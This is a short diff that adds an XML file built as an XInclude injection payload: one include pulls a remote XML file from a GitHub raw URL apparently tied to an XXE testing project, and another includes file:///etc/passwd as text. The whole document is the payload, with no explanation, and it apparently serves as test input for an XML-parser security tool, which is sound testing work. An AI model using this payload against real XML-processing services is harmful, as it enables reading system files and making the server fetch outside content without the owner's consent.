@@ -1,0 +1,4 @@
+<data xmlns:xi="http://www.w3.org/2001/XInclude">
+    <xi:include href="https://raw.githubusercontent.com/patrickhener/xxexsd/main/test.xml"/>
+    <xi:include href="file:///etc/passwd" parse="text"/>
+</data>
